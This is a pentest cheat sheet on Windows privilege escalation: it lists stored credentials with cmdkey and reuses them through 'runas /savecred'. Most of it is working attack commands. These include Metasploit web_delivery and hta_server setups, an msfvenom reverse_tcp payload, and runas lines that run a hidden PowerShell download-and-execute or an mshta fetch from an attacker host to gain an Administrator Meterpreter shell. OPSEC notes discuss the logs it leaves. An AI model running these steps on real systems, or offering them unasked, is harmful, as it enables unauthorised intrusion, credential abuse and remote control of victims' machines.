
> [!abstract] Windows Privilege Escalation via `cmdkey`
> The **cmdkey** command is a built-in Windows utility used to manage stored credentials (Credential Manager). Attackers abuse this feature to find saved credentials of higher-privileged users (like Administrators) and use them to escalate privileges or move laterally without needing to crack or dump password hashes.
> **MITRE ATT&CK Mapping:** [T1003.005 - OS Credential Dumping: Cached Domain Credentials](https://attack.mitre.org/techniques/T1003/005/) | [T1078 - Valid Accounts](https://attack.mitre.org/techniques/T1078/)

## What is `cmdkey` and Why Check It?

> [!info] Understanding `cmdkey`
> **What is it?** 
> Windows allows users to save their usernames and passwords for remote connections (like RDP, SMB shares, or web authentication) so they don't have to type them every time. `cmdkey` is the command-line tool to create, list, and delete these saved credentials (Stored Credentials).
> 
> **Why should it be checked during a pentest?**
> Sometimes, administrators or standard users save their credentials on a machine for convenience (e.g., to map a network drive). If an attacker compromises that machine, they can list these saved credentials.
> 
> **How does it lead to Privilege Escalation?**
> If you find a saved credential for an `Administrator` or a high-privileged domain user, you don't get the plaintext password, but you can use the `runas /savecred` command. This tells Windows to use the stored credential to execute a process (like a reverse shell payload) as that high-privileged user, instantly escalating your privileges!

---

## Enumeration (Finding Saved Credentials)

> [!example]+ Listing Stored Credentials
> The first step is to check if any credentials are saved on the compromised machine.
> 
> ```cmd
> :: List all stored credentials
> cmdkey /list
> 
> :: Or simply run cmdkey
> cmdkey
> ```
> *Look for entries where the `User:` field belongs to an Administrator or a privileged account.*

---

## Execution & Lateral Movement

> [!danger]+ Using `runas /savecred`
> Once you find a saved credential, you can use `runas` with the `/savecred` flag to execute commands as that user without being prompted for a password.
> 
> **Simple CMD Execution:**
> ```cmd
> :: Opens a new CMD window as the administrator using their saved credential
> runas /savecred /user:administrator cmd
> ```

---

## Privilege Escalation Payload Delivery

> [!tip]+ Upgrading to Meterpreter via `runas /savecred`
> To get a full Meterpreter session as the Administrator, you need to execute a payload using the saved credential. Here are three methods to deliver the payload:
> 
> **Method 1: Web Delivery (PowerShell without Base64)**
> *Note: `runas` often fails to execute complex Base64 PowerShell commands. Disabling the encoded command in Metasploit generates a cleaner, raw PowerShell script.*
> ```bash
> msfconsole -qx "search web_delivery"
> msf6> use exploit/multi/script/web_delivery
> msf6> set LHOST <KALI_IP>
> msf6> set LPORT <LPORT>
> msf6> set payload windows/x64/meterpreter/reverse_tcp
> msf6> set target 2
> msf6> set PSH-ENCODEDCOMMAND false
> msf6> exploit
> ```
> *Copy the generated PowerShell command and run it via `runas`:*
> ```cmd
> runas /savecred /user:administrator "powershell.exe -nop -w hidden -c IEX..."
> ```
> 
> **Method 2: HTA Server (Stealthier)**
> ```bash
> msfconsole -qx "search hta_server"
> msf6> use exploit/windows/misc/hta_server
> msf6> set LHOST <KALI_IP>
> msf6> exploit
> ```
> *Run the HTA payload via `runas`:*
> ```cmd
> runas /savecred /user:administrator "mshta.exe http://<KALI_IP>/random.hta"
> ```
> 
> **Method 3: Uploading an Executable**
> *If network delivery fails, upload a raw payload to the target and execute it.*
> ```bash
> # 1. Create the payload
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o file.exe
> 
> # 2. Setup handler
> msf6> use exploit/multi/handler
> msf6> set payload windows/x64/meterpreter/reverse_tcp
> msf6> exploit -j
> ```
> *Inside your existing Meterpreter session (as low-priv user):*
> ```ruby
> meterpreter> pwd
> meterpreter> upload file.exe
> meterpreter> shell
> ```
> *Drop into CMD and execute the uploaded file using the saved Administrator credential:*
> ```cmd
> runas /savecred /user:administrator file.exe
> ```

> [!warning] OPSEC Notes
> - Using `runas /savecred` generates **Event ID 4624 (Type 2 - Interactive Logon)** or **Type 9 (NewCredentials)** on the target, showing that the Administrator account logged in interactively.
> - This technique is completely "Living Off The Land" (LOL) as both `cmdkey` and `runas` are native Windows binaries.
